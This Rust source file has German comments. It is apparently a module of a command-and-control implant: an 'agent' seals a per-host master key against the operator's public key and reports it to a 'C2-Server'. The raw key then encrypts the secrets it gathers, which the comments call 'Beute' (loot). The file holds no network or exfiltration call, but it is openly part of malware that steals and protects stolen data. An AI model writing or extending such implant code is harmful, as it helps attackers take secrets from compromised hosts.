//! Kapselung des Host-Master-Keys gegen den oeffentlichen Server-Schluessel.
//!
//! Der Agent besitzt den privaten Server-Schluessel nicht. Er kapselt einen
//! Master-Key gegen den oeffentlichen Schluessel des Operators und meldet
//! beide Teile an den C2-Server: der Server kann den Master-Key wieder
//! gewinnen, ohne dass der Agent ihn jemals im Klartext uebertragen muss.
//!
//! Je Host ein eigener Master-Key — die Beute eines Hosts laesst sich nur mit
//! dem Schluessel dieses Hosts lesen.

use kx_core::hostkey::{DecodedServerKey, ServerPublicKey};

/// Material, mit dem der Agent Host-Master-Keys versiegelt.
pub struct KeySealer {
    server: DecodedServerKey,
}

/// Das Ergebnis einer Kapselung: Master-Key und versiegeltes Material, beide
/// base64-kodiert — so, wie die Wire-Felder es verlangen.
pub struct SealedHostKey {
    /// Das versiegelte Material (base64) — das geht an den C2-Server.
    pub sealed_master: String,
    /// Der Master-Key in Rohform — damit werden die Secrets verschluesselt.
    pub roh: [u8; 32],
}

impl KeySealer {
    /// Laedt den oeffentlichen Server-Schluessel aus einer JSON-Datei.
    ///
    /// Die Datei enthaelt die `ServerPublicKey`-Struktur aus
    /// `kx_core::hostkey` — erzeugt mit `cargo run -p kx-core --example
    /// gen_server_key`.
    pub fn load(pfad: &str) -> Result<Self, String> {
        let text = std::fs::read_to_string(pfad)
            .map_err(|e| format!("Server-Schluessel {pfad} nicht lesbar: {e}"))?;
        let public: ServerPublicKey =
            serde_json::from_str(&text).map_err(|e| format!("Server-Schluessel ungueltig: {e}"))?;
        let server = public
            .decode()
            .map_err(|e| format!("Server-Schluessel ungueltig: {e}"))?;
        Ok(KeySealer { server })
    }

    /// Kapselt einen neuen Master-Key fuer einen Host.
    ///
    /// Ohne gueltigen Server-Schluessel gibt es kein Schluesselmaterial — der
    /// Aufrufer meldet die Beute dann ohne Verschluesselung, wie es ein
    /// aelterer Agent auch tut.
    pub fn seal_for_host(&self) -> Option<SealedHostKey> {
        let kapselung = kx_core::hostkey::encapsulate_host_master_key_os(&self.server).ok()?;
        Some(SealedHostKey {
            sealed_master: kx_core::util::b64_encode(&kapselung.sealed_master),
            roh: kapselung.master_key,
        })
    }
}
